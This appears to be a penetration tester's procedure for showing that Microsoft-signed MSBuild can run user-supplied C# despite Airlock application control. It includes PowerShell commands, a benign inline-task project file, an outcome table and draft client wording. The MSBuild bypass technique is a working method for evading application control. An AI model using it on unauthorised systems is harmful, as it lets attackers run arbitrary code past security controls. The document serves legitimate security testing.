@@ -1,0 +1,155 @@
+1. Establish user context and locate MSBuild
+whoami
+
+$msbuild32 = "C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe"
+$msbuild64 = "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe"
+
+[pscustomobject]@{
+    MSBuild32 = Test-Path $msbuild32
+    MSBuild64 = Test-Path $msbuild64
+}
+
+Take a screenshot showing whoami and both binaries being present.
+2. Confirm they are Microsoft-signed
+Get-AuthenticodeSignature $msbuild32 |
+Select-Object Status,@{N='Signer';E={$_.SignerCertificate.Subject}},Path
+
+Get-AuthenticodeSignature $msbuild64 |
+Select-Object Status,@{N='Signer';E={$_.SignerCertificate.Subject}},Path
+
+What you want:
+Status : Valid
+Signer : ...Microsoft...
+
+This is useful because the finding is specifically about abuse of a trusted Microsoft-signed utility.
+3. Create the benign user-controlled MSBuild project
+Run:
+$project = "$env:TEMP\Ionize-MSBuild-Test.csproj"
+
+@'
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+
+  <UsingTask
+      TaskName="IonizeTask"
+      TaskFactory="CodeTaskFactory"
+      AssemblyFile="$(MSBuildToolsPath)\Microsoft.Build.Tasks.v4.0.dll">
+
+    <Task>
+      <Code Type="Class" Language="cs">
+        <![CDATA[
+using System;
+using Microsoft.Build.Framework;
+using Microsoft.Build.Utilities;
+
+public class IonizeTask : Task
+{
+    public override bool Execute()
+    {
+        Console.WriteLine("Ionize MSBuild application control test");
+        Console.WriteLine("User: " + Environment.UserName);
+        Console.WriteLine("Machine: " + Environment.MachineName);
+        Console.WriteLine("Date: 12 Oct 2026");
+        return true;
+    }
+}
+        ]]>
+      </Code>
+    </Task>
+
+  </UsingTask>
+
+  <Target Name="IonizeTest">
+    <IonizeTask />
+  </Target>
+
+</Project>
+'@ | Set-Content $project -Encoding ASCII
+
+Get-Item $project | Select-Object FullName,Length,LastWriteTime
+
+Then display the interesting part for your evidence:
+Get-Content $project
+
+This proves the test file is sitting in a standard-user-writable directory and only contains a harmless console marker.
+4. Execute with 64-bit MSBuild
+whoami
+
+& $msbuild64 $project /t:IonizeTest /nologo /verbosity:minimal
+
+"Exit code: $LASTEXITCODE"
+
+A confirmed vulnerable result would resemble:
+Ionize MSBuild application control test
+User: <standard user>
+Machine: <hostname>
+Date: 12 Oct 2026
+Exit code: 0
+
+Take a screenshot containing whoami, the MSBuild command, the Ionize output and exit code.
+5. Execute with 32-bit MSBuild
+whoami
+
+& $msbuild32 $project /t:IonizeTest /nologo /verbosity:minimal
+
+"Exit code: $LASTEXITCODE"
+
+Again, capture the same evidence.
+You don't need both architectures to succeed for the issue to exist. One successful path is sufficient; both succeeding just gives stronger coverage.
+6. Capture the Airlock contrast
+Now use one of the simple executable/script samples that Airlock definitely blocks and capture the Airlock notification.
+For example, your previous EXE/HTA/JS evidence is ideal.
+The two screenshots together should communicate:
+Direct unapproved execution → Airlock blocks it.
+
+versus:
+User-controlled C# supplied to Microsoft-signed MSBuild → code executes.
+
+That contrast is probably the strongest client evidence you can provide.
+Also note what Airlock does during the MSBuild run:
+- No Airlock notification: record that.
+- Audit/warning only but code still executes: still a successful bypass; record that execution was permitted despite detection.
+- Explicit block and Ionize marker does not execute: not a successful bypass.
+7. Optional second user-writable location
+If you want to remove any doubt that %TEMP% is special, copy the exact same project to Downloads:
+Copy-Item $project "$env:USERPROFILE\Downloads\Ionize-MSBuild-Test.csproj" -Force
+
+& $msbuild64 "$env:USERPROFILE\Downloads\Ionize-MSBuild-Test.csproj" `
+    /t:IonizeTest /nologo /verbosity:minimal
+
+If it executes there too, that's good supporting evidence that this isn't dependent on one unusual path.
+Afterwards:
+Remove-Item "$env:TEMP\Ionize-MSBuild-Test.csproj" -Force -ErrorAction SilentlyContinue
+Remove-Item "$env:USERPROFILE\Downloads\Ionize-MSBuild-Test.csproj" -Force -ErrorAction SilentlyContinue
+
+How I'd interpret the outcomes
+Outcome	Conclusion
+MSBuild absent	Not applicable for that architecture
+Both versions blocked by Airlock before code executes	No MSBuild bypass demonstrated
+MSBuild runs but project fails to compile	Inconclusive; troubleshoot before reporting
+One version executes the Ionize code	Application-control bypass confirmed
+Both versions execute the code	Strong confirmation
+Code executes and Airlock produces no block	Strongest result
+Code executes but Airlock generates audit/detection	Still a bypass; note that detection exists
+Code executes as standard user only	Expected; still supports High application-control finding, but not privilege escalation
+
+
+If the test succeeds
+I’d send the client:
+During application-control testing, Ionize identified that a standard user can leverage the Microsoft-signed MSBuild.exe utility to execute user-supplied C# code despite Airlock preventing direct execution of unapproved executable and scripting formats. Testing was performed using a benign project file created within a standard-user-writable directory, which successfully executed and returned an Ionize-controlled test marker in the context of the logged-in user. The behaviour was reproduced using [both the 32-bit and 64-bit versions / the affected version] of MSBuild. This represents an application-control bypass through trusted Microsoft tooling and is currently being assessed as a High-severity finding. No privilege escalation was performed as part of this validation.
+
+If Airlock also didn't alert:
+No Airlock block notification was observed during execution.
+
+If Airlock logged/audited it:
+Airlock generated an audit/detection event; however, execution was still permitted.
+
+If only one architecture succeeds
+Use:
+The behaviour was reproduced using the [32-bit/64-bit] .NET Framework version of MSBuild. The alternate version was [blocked/not present/failed to execute the project].
+
+Still a valid finding.
+If Airlock blocks it now
+Send:
+Follow-up testing identified that Airlock prevented execution of user-supplied code through MSBuild. The previously observed behaviour could not be reproduced under the current policy state, and Ionize is validating whether a configuration or policy change occurred during testing.
+
+For the report, the cleanest evidence sequence is Figure 1: Airlock blocks normal executable → Figure 2: benign .csproj content → Figure 3: standard user successfully executes that code through Microsoft-signed MSBuild. That tells the whole story without needing a more aggressive payload.
